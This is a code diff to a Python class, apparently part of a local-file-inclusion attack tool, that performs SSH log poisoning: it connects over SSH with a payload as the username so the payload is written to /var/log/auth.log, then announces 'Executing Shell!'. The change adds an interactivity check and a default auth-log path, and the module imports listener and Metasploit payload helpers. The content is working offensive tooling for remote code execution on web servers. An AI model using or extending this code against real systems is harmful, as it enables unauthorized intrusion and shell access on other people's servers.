@@ -1,24 +1,36 @@
 from os import system
 from urllib import parse
 
-from .utils import listener, attack, colors, cook, msf_payload
+from .utils import (
+    listener,
+    attack,
+    colors,
+    cook,
+    msf_payload,
+    is_interactive,
+    resolve_location,
+)
 
 
 from .Detection import Detection
+
+
+DEFAULT_AUTH_LOG = "/var/log/auth.log"
 
 
 # TODO: Not working properly. Fix this
 class SSHLogs:
     def __init__(self, args):
         self.target = args.url
-        self.location = args.location
+        self.location = resolve_location(args.location, DEFAULT_AUTH_LOG)
         self.relative = args.relative
         self.cookies = args.cookies
         self.detection = args.detection
 
     def attack(self, payload):
-        host = parse.urlsplit(self.target).netloc
-        system('/usr/bin/ssh "{0}@{1}"'.format(payload, host))
+        if is_interactive():
+            host = parse.urlsplit(self.target).netloc
+            system('/usr/bin/ssh "{0}@{1}"'.format(payload, host))
 
         if self.cookies:
             f_cookies = cook(self.cookies)
@@ -45,8 +57,9 @@ class SSHLogs:
 
         print(colors("[~] Start SSH Log Poisoning ...", 93))
 
-        host = parse.urlsplit(self.target).netloc
-        system('/usr/bin/ssh "{0}@{1}"'.format(payload, host))
+        if is_interactive():
+            host = parse.urlsplit(self.target).netloc
+            system('/usr/bin/ssh "{0}@{1}"'.format(payload, host))
 
         print(colors("[~] Executing Shell!", 93))
 
